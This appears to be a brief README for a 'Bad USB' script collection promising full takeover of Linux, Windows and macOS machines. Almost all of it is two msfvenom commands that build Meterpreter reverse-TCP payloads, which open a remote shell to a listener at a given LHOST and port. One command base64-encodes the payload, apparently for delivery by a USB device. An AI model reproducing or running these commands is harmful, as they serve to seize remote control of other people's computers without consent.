# Bad USB Scripts

- Full PC takeover scripts for all 3 major OSes

### Payload Generation using msfvenom
For Linux :
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.88.229 LPORT=1337 -f elf | base64`

For MacOS :
`msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.88.235 LPORT=1337 -f macho > osx`
